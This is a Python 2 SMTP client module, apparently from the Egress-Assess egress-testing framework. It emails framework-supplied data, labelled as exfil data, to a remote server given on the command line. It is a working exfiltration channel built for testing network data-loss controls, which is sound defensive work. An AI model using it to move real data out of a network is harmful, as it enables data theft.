'''

This is a SMTP client module.  Sample code came from:
http://pymotw.com/2/smtpd/

'''

import smtplib
import email.utils
from email.mime.text import MIMEText


class Client:

    # Within __init__, you have access to everything passed in
    # via the command line.  self.protocol is the variable listed
    # when running --list-clients and is what is used in conjunction
    # with --client <client>.  self.protocol is the only required attribute
    # of the object.
    def __init__(self, cli_object):
        self.protocol = "smtp"
        self.remote_server = cli_object.ip

    # transmit is the only required function within the object.  It is what
    # called by the framework to transmit data.  However, you can create as 
    # many "sub functions" for transmit to invoke as needed.  "data_to_transmit"
    # is a variable passed in by the framework which contains the data that 
    # is to be sent out by the client.
    def transmit(self, data_to_transmit):

        print "[*] Sending data over e-mail..."

        # Create the message
        msg = MIMEText('This is the data to exfil:\n\n' + data_to_transmit)
        msg['To'] = email.utils.formataddr(('Server', 'server@egress-assess.com'))
        msg['From'] = email.utils.formataddr(('Tester', 'tester@egress-assess.com'))
        msg['Subject'] = 'Egress-Assess Exfil Data'

        server = smtplib.SMTP(self.remote_server, 25)
        server.set_debuglevel(False)
        try:
            server.sendmail('tester@egress-assess.com', ['server@egress-assess.com'], msg.as_string())
        finally:
            server.quit()

        print "[*] Data transmitted!"

        return
